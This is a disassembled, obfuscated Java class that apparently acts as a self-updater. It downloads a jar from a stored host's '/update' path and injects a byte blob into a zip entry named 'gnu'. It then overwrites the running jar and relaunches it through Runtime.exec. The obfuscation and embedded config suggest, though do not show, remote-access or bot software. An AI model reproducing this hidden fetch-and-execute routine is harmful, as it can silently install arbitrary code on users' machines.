// class version 52.0 (52)
// access flags 0x21
public class X {

  // compiled from: 

  ATTRIBUTE Code : unknown

  // access flags 0x1A
  private final static [B a

  // access flags 0x1
  public <init>()V
   L0
    LINENUMBER 16 L0
    ALOAD 0
    INVOKESPECIAL java/lang/Object.<init> ()V
    RETURN
    MAXSTACK = 1
    MAXLOCALS = 1

  // access flags 0x9
  public static a()V throws java/lang/Exception 
   L0
    LINENUMBER 21 L0
    NEW java/io/File
    DUP
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getAbsoluteFile ()Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getAbsolutePath ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC ".tmp"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    ASTORE 0
   L1
    LINENUMBER 24 L1
    GETSTATIC b.b : Z
    IFEQ L2
   L3
    LINENUMBER 25 L3
    LDC 2000
    INVOKESTATIC java/lang/Thread.sleep (J)V
   L4
    LINENUMBER 27 L4
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    ICONST_0
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/String.length ()I
    LDC ".tmp"
    INVOKEVIRTUAL java/lang/String.length ()I
    ISUB
    INVOKEVIRTUAL java/lang/String.substring (II)Ljava/lang/String;
    ASTORE 1
   L5
    LINENUMBER 29 L5
    NEW java/io/File
    DUP
    ALOAD 1
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    INVOKESTATIC b.a ()[B
    INVOKESTATIC X.a (Ljava/io/File;[B)V
   L6
    LINENUMBER 31 L6
    GETSTATIC b.a : Ljava/net/ServerSocket;
    INVOKEVIRTUAL java/net/ServerSocket.close ()V
   L7
    LINENUMBER 33 L7
    LDC 2000
    INVOKESTATIC java/lang/Thread.sleep (J)V
   L8
    LINENUMBER 35 L8
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    GETSTATIC b.b : Ljava/lang/String;
    AASTORE
    DUP
    ICONST_1
    LDC "-jar"
    AASTORE
    DUP
    ICONST_2
    ALOAD 1
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    POP
   L9
    LINENUMBER 37 L9
    NEW java/io/File
    DUP
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    INVOKEVIRTUAL java/io/File.deleteOnExit ()V
   L10
    LINENUMBER 38 L10
    RETURN
   L2
    LINENUMBER 41 L2
   FRAME APPEND [java/io/File]
    INVOKESTATIC W.a ()LW;
    GETSTATIC W.WINDOWS : LW;
    IF_ACMPEQ L11
   L12
    LINENUMBER 44 L12
    ALOAD 0
    INVOKESTATIC b.a ()[B
    INVOKESTATIC X.a (Ljava/io/File;[B)V
   L13
    LINENUMBER 46 L13
    ALOAD 0
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ICONST_1
    ANEWARRAY java/nio/file/CopyOption
    DUP
    ICONST_0
    GETSTATIC java/nio/file/StandardCopyOption.REPLACE_EXISTING : Ljava/nio/file/StandardCopyOption;
    AASTORE
    INVOKESTATIC java/nio/file/Files.copy (Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;
    POP
   L14
    LINENUMBER 49 L14
    GETSTATIC b.a : Z
    IFNE L15
   L16
    LINENUMBER 50 L16
    GETSTATIC b.a : Ljava/net/ServerSocket;
    INVOKEVIRTUAL java/net/ServerSocket.close ()V
   L17
    LINENUMBER 51 L17
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    GETSTATIC b.b : Ljava/lang/String;
    AASTORE
    DUP
    ICONST_1
    LDC "-jar"
    AASTORE
    DUP
    ICONST_2
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    POP
    GOTO L15
   L11
    LINENUMBER 55 L11
   FRAME SAME
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "coping to"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC " to "
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    ALOAD 0
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L18
    LINENUMBER 56 L18
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ALOAD 0
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ICONST_1
    ANEWARRAY java/nio/file/CopyOption
    DUP
    ICONST_0
    GETSTATIC java/nio/file/StandardCopyOption.REPLACE_EXISTING : Ljava/nio/file/StandardCopyOption;
    AASTORE
    INVOKESTATIC java/nio/file/Files.copy (Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;
    POP
   L19
    LINENUMBER 57 L19
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    LDC "closing socket"
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L20
    LINENUMBER 58 L20
    GETSTATIC b.a : Ljava/net/ServerSocket;
    INVOKEVIRTUAL java/net/ServerSocket.close ()V
   L21
    LINENUMBER 59 L21
    LDC 1000
    INVOKESTATIC java/lang/Thread.sleep (J)V
   L22
    LINENUMBER 60 L22
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "running: "
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    GETSTATIC b.c : Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC " -Dupdate=true -jar "
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    ALOAD 0
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L23
    LINENUMBER 62 L23
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_4
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    GETSTATIC b.c : Ljava/lang/String;
    AASTORE
    DUP
    ICONST_1
    LDC "-Dupdate=true"
    AASTORE
    DUP
    ICONST_2
    LDC "-jar"
    AASTORE
    DUP
    ICONST_3
    ALOAD 0
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    POP
   L15
    LINENUMBER 64 L15
   FRAME CHOP 1
    RETURN
    MAXSTACK = 6
    MAXLOCALS = 2

  // access flags 0x9
  public static a(Ljava/io/InputStream;Ljava/io/OutputStream;)V throws java/io/IOException 
    // parameter  inputStream
    // parameter  outputStream
   L0
    LINENUMBER 75 L0
   FRAME SAME
    ALOAD 0
    GETSTATIC X.a : [B
    INVOKEVIRTUAL java/io/InputStream.read ([B)I
    DUP
    ISTORE 2
    ICONST_M1
    IF_ICMPEQ L1
   L2
    LINENUMBER 76 L2
    ALOAD 1
    GETSTATIC X.a : [B
    ICONST_0
    ILOAD 2
    INVOKEVIRTUAL java/io/OutputStream.write ([BII)V
    GOTO L0
   L1
    LINENUMBER 78 L1
   FRAME CHOP 2
    RETURN
    MAXSTACK = 4
    MAXLOCALS = 3

  // access flags 0x9
  public static a(Ljava/io/File;[B)V throws java/lang/Exception 
    // parameter  file
    // parameter  arr
   L0
    LINENUMBER 84 L0
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "http://"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    GETSTATIC b.string0 : Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC "/update"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    ASTORE 2
   L1
    LINENUMBER 86 L1
    NEW java/net/URL
    DUP
    ALOAD 2
    INVOKESPECIAL java/net/URL.<init> (Ljava/lang/String;)V
    INVOKEVIRTUAL java/net/URL.openConnection ()Ljava/net/URLConnection;
    CHECKCAST java/net/HttpURLConnection
    ASTORE 3
   L2
    LINENUMBER 88 L2
    ALOAD 3
    INVOKEVIRTUAL java/net/HttpURLConnection.getInputStream ()Ljava/io/InputStream;
    ALOAD 0
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ICONST_1
    ANEWARRAY java/nio/file/CopyOption
    DUP
    ICONST_0
    GETSTATIC java/nio/file/StandardCopyOption.REPLACE_EXISTING : Ljava/nio/file/StandardCopyOption;
    AASTORE
    INVOKESTATIC java/nio/file/Files.copy (Ljava/io/InputStream;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)J
    POP2
   L3
    LINENUMBER 90 L3
    NEW java/util/zip/ZipFile
    DUP
    ALOAD 0
    INVOKESPECIAL java/util/zip/ZipFile.<init> (Ljava/io/File;)V
    ALOAD 1
    INVOKESTATIC X.a (Ljava/util/zip/ZipFile;[B)V
   L4
    LINENUMBER 92 L4
    RETURN
    MAXSTACK = 6
    MAXLOCALS = 4

  // access flags 0x9
  public static a(Ljava/util/zip/ZipFile;[B)V throws java/io/IOException 
    // parameter  zipFile
    // parameter  arr
   L0
    LINENUMBER 97 L0
    NEW java/io/File
    DUP
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    ALOAD 0
    INVOKEVIRTUAL java/util/zip/ZipFile.getName ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC ".tmpzip"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    ASTORE 2
   L1
    LINENUMBER 100 L1
    NEW java/io/File
    DUP
    ALOAD 0
    INVOKEVIRTUAL java/util/zip/ZipFile.getName ()Ljava/lang/String;
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ALOAD 2
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ICONST_1
    ANEWARRAY java/nio/file/CopyOption
    DUP
    ICONST_0
    GETSTATIC java/nio/file/StandardCopyOption.REPLACE_EXISTING : Ljava/nio/file/StandardCopyOption;
    AASTORE
    INVOKESTATIC java/nio/file/Files.copy (Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;
    POP
   L2
    LINENUMBER 102 L2
    NEW java/util/zip/ZipFile
    DUP
    ALOAD 2
    INVOKESPECIAL java/util/zip/ZipFile.<init> (Ljava/io/File;)V
    ASTORE 3
   L3
    LINENUMBER 104 L3
    NEW java/util/zip/ZipOutputStream
    DUP
    ALOAD 0
    INVOKEVIRTUAL java/util/zip/ZipFile.getName ()Ljava/lang/String;
    ICONST_0
    ANEWARRAY java/lang/String
    INVOKESTATIC java/nio/file/Paths.get (Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;
    ICONST_0
    ANEWARRAY java/nio/file/OpenOption
    INVOKESTATIC java/nio/file/Files.newOutputStream (Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/io/OutputStream;
    INVOKESPECIAL java/util/zip/ZipOutputStream.<init> (Ljava/io/OutputStream;)V
    ASTORE 4
   L4
    LINENUMBER 107 L4
    ALOAD 3
    INVOKEVIRTUAL java/util/zip/ZipFile.entries ()Ljava/util/Enumeration;
    ASTORE 5
   L5
    LINENUMBER 110 L5
   FRAME FULL [java/util/zip/ZipFile [B java/io/File java/util/zip/ZipFile java/util/zip/ZipOutputStream java/util/Enumeration] []
    ALOAD 5
    INVOKEINTERFACE java/util/Enumeration.hasMoreElements ()Z (itf)
    IFEQ L6
   L7
    LINENUMBER 111 L7
    ALOAD 5
    INVOKEINTERFACE java/util/Enumeration.nextElement ()Ljava/lang/Object; (itf)
    CHECKCAST java/util/zip/ZipEntry
    ASTORE 6
   L8
    LINENUMBER 112 L8
    NEW java/util/zip/ZipEntry
    DUP
    ALOAD 6
    INVOKEVIRTUAL java/util/zip/ZipEntry.getName ()Ljava/lang/String;
    INVOKESPECIAL java/util/zip/ZipEntry.<init> (Ljava/lang/String;)V
    ASTORE 7
   L9
    LINENUMBER 113 L9
    ALOAD 4
    ALOAD 7
    INVOKEVIRTUAL java/util/zip/ZipOutputStream.putNextEntry (Ljava/util/zip/ZipEntry;)V
   L10
    LINENUMBER 114 L10
    ALOAD 7
    INVOKEVIRTUAL java/util/zip/ZipEntry.isDirectory ()Z
    IFNE L11
   L12
    LINENUMBER 115 L12
    ALOAD 7
    INVOKEVIRTUAL java/util/zip/ZipEntry.getName ()Ljava/lang/String;
    LDC "gnu"
    INVOKEVIRTUAL java/lang/String.equals (Ljava/lang/Object;)Z
    IFEQ L13
   L14
    LINENUMBER 116 L14
    ALOAD 4
    ALOAD 1
    INVOKEVIRTUAL java/util/zip/ZipOutputStream.write ([B)V
    GOTO L11
   L13
    LINENUMBER 118 L13
   FRAME APPEND [java/util/zip/ZipEntry]
    ALOAD 3
    ALOAD 6
    INVOKEVIRTUAL java/util/zip/ZipFile.getInputStream (Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;
    ALOAD 4
    INVOKESTATIC X.a (Ljava/io/InputStream;Ljava/io/OutputStream;)V
   L11
    LINENUMBER 122 L11
   FRAME CHOP 1
    ALOAD 4
    INVOKEVIRTUAL java/util/zip/ZipOutputStream.closeEntry ()V
   L15
    LINENUMBER 123 L15
    GOTO L5
   L6
    LINENUMBER 125 L6
   FRAME FULL [java/util/zip/ZipFile T java/io/File java/util/zip/ZipFile java/util/zip/ZipOutputStream] []
    ALOAD 3
    INVOKEVIRTUAL java/util/zip/ZipFile.close ()V
   L16
    LINENUMBER 126 L16
    ALOAD 0
    INVOKEVIRTUAL java/util/zip/ZipFile.close ()V
   L17
    LINENUMBER 127 L17
    ALOAD 4
    INVOKEVIRTUAL java/util/zip/ZipOutputStream.close ()V
   L18
    LINENUMBER 129 L18
    ALOAD 2
    INVOKEVIRTUAL java/io/File.delete ()Z
    POP
   L19
    LINENUMBER 131 L19
    RETURN
    MAXSTACK = 6
    MAXLOCALS = 8

  // access flags 0x8
  static <clinit>()V
   L0
    LINENUMBER 67 L0
    LDC 4194304
    NEWARRAY T_BYTE
    PUTSTATIC X.a : [B
    RETURN
    MAXSTACK = 1
    MAXLOCALS = 0
}
